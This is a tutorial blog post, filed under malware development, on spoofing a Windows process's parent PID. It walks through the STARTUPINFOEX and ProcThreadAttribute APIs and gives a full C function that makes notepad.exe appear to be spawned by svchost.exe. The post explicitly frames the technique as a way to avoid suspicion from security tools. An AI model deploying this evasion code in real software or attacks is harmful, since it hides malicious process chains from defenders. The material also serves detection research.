---
layout: post
title: "Spoofing Parent Process ID (PPID)"
date: 2024-07-29 09:49:00 +0000
tags: [Malware Development]
categories: [Malware Development]
---

# Spoofing Parent Process ID (PPID)


Parent Process ID (PPID) spoofing is a technique used to manipulate the relationship between a child process and its parent process. This makes it appear as though the child process was initiated by a different, legitimate process.

This can be achieved by modifying the parent process ID, making it appear as though the process originated from a trusted source. For example, an Excel sheet spawning a \`cmd.exe\` process would typically raise suspicions with security solutions, but \`svchost.exe\` spawning a \`cmd.exe\` would not.

Let’s explore how to spoof the Parent Process ID (PPID) of a process.

Creating a process
-------------------

To spoof a process PPID, we first need to create a process using the [CreateProcess](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessw) WinAPI with the `EXTENDED_STARTUPINFO_PRESENT` flag set in the `dwCreationFlags` parameter. According to Microsoft documentation, this requires a [STARTUPINFOEX](https://learn.microsoft.com/en-us/windows/win32/api/winbase/ns-winbase-startupinfoexw) structure in the `lpStartupInfo` parameter.

![Extended_startup](/assets/img/2024-07-16-png_spoofing_parent_process/startupinfo_present.png)

STARTUPINFOEX structure
-----------------------

The `STARTUPINFOEX` structure specifies the window station, desktop, standard handles, and attributes for a new process. Since it is responsible for defining attributes for a new process, it will be particularly useful for our purpose.

The structure `STARTUPINFOEX` is shown below.

```c++
typedef struct _STARTUPINFOEXW {
    STARTUPINFOW StartupInfo;
    LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList;
} STARTUPINFOEXW, *LPSTARTUPINFOEXW;
```


*   **Startupinfo**: same as Startupinfo structure which was used to create a normal process.
*   **lpAttributeList**: An attribute list. This list is created by the [InitializeProcThreadAttributeList](https://learn.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-initializeprocthreadattributelist) function.

As the `InitializeProcThreadAttributeList` function creates an attribute list for the process in inside `STARTUPINFOEX` structure. we have to take a look at it.

InitializeProcThreadAttributeList
---------------------------------

[`InitializeProcThreadAttributeList`](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-initializeprocthreadattributelist) is responsible for Initializing the specified list of attributes for process and thread creation.

The `InitializeProcThreadAttributeList` function is shown below:

```c
BOOL InitializeProcThreadAttributeList(
  [out, optional] LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList,
  [in]            DWORD                        dwAttributeCount,
                  DWORD                        dwFlags,
  [in, out]       PSIZE_T                      lpSize
);
```


parameters:

*   **lpAttributeList**: A pointer to the attribute list.
*   **dwAttributeCount**: The number of attributes to set.
*   **dwFlags**: This parameter is reserved and must be zero.
*   **lpSize**: This will return the size required to set the attributes.

The `dwAttributeCount`will be set to 1 since only one attribute is needed.

According to the microsoft the initial call to this function will return an error by design which will return the size required to allocate enough space for the data in the `lpAttributelist` buffer and call the function again to initialize the buffer. next the [`UpdateProcThreadAttribute`](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-updateprocthreadattribute)function will be responsible for adding attributes to the list.

![Initialize_procthread](assets/img/2024-07-16-png_spoofing_parent_process/remarks_initialize_proc_thread.png)


UpdateProcThreadAttribute
-------------------------

The [`UpdateProcThreadAttribute`](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-updateprocthreadattribute) function is shown below

```c
BOOL UpdateProcThreadAttribute(
  [in, out]       LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList,
  [in]            DWORD                        dwFlags,
  [in]            DWORD_PTR                    Attribute,
  [in]            PVOID                        lpValue,
  [in]            SIZE_T                       cbSize,
  [out, optional] PVOID                        lpPreviousValue,
  [in, optional]  PSIZE_T                      lpReturnSize
);
```


parameters:

*   **lpAttributeList**: A pointer to the attribute list initialized by `InitializeProcThreadAttributeList`. This list contains attributes to be updated.
*   **dwFlags**: Reserved; must be zero.
*   **Attribute**: The attribute to update. For our spoofing of PPID the `PROC_THREAD_ATTRIBUTE_PARENT_PROCESS` is required.

*   **lpValue**: A pointer to the value for the attribute being updated. in our case of PPID spoofing it becomes the handle of the parent process.
*   **cbSize**: The size of the value pointed to by `lpValue`, in bytes.
*   **lpPreviousValue**: Optional. A pointer to receive the previous value of the attribute, if needed.
*   **lpReturnSize**: Optional. A pointer to receive the size of the previous attribute value returned in `lpPreviousValue`.

LOGIC
-----

1.  call `InitializeProcThreadAttributeList` to set the number of attributes to be set and allocate enough space for the attributelist.
2.  call `UpdateProcThreadAttribute` with `PROC_THREAD_ATTRIBUTE_PARENT_PROCESS` to initialize the attribute.
3.  call `CreateProcessW` with the `EXTENDED_STARTUPINFO_PRESENT` flag and utilize the `STARTUPINFOEXW` structure that has been initialized using `InitializeProcThreadAttributeList` and updated using `UpdateProcThreadAttribute`

ParentPIDSpoofing function
--------------------------

`ParentPIDSpoofing` is a function that creates process with Spoofed PPID.

parameters:

*   **hprocess**: handle of the parent process whose PID is to be spoofed.
*   **newprocessname**: name of the process to create.
*   **hnewprocess**: A pointer to the handle which receives handle to the newly created process.
*   **dwnewPID**: A pointer to the PID which receives PID of the newly created process.

```C

BOOL ParentPIDSpoofing(handle hprocess, LPWSTR newprocessname, HANDLE* hnewprocess, DWORD *dwnewPID) {
 STARTUPINFOEXW SI = { 0 };
 PROCESS_INFORMATION PI = { 0 };
 SI.StartupInfo.cb = sizeof(STARTUPINFOW);
 SIZE_T Attributelist = 0;
 SI.StartupInfo.cb = sizeof(STARTUPINFOEXW);
 InitializeProcThreadAttributeList(NULL, 1, 0, &Attributelist);
 SI.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, Attributelist);
 if (SI.lpAttributeList == NULL) {
  printf("Heap alloc failed with error no %x\n", GetLastError());
  return FALSE;
 }
 if (!InitializeProcThreadAttributeList(SI.lpAttributeList, 1, 0, &Attributelist)) {
  printf("InitializeProcThreadAttirbuteList failed with error no %x\n", GetLastError());
  return FALSE;
 }
 if (!UpdateProcThreadAttribute(SI.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hprocess, sizeof(hprocess), NULL, NULL)) {
  printf("UpdateProcThreadAttirbute failed with error no %x\n", GetLastError());
  return FALSE;
 }
 if (!CreateProcessW(NULL, newprocessname, NULL, NULL, FALSE, EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &SI.StartupInfo, &PI)) {
  printf("The CreateprocessW failed with error no %x\n", GetLastError());
  return FALSE;
 }
 *hnewprocess = PI.hProcess;
 *dwnewPID = PI.dwProcessId;
 return TRUE;
}
```


Execution
---------

Create the child process `Notepad.exe` with the parent process being `svchost.exe`, which has a PID of 4312.

`NOTE: svchost.exe is running with normal privileges.`

`Notepad.exe` appears to be spawned by `svchost.exe` .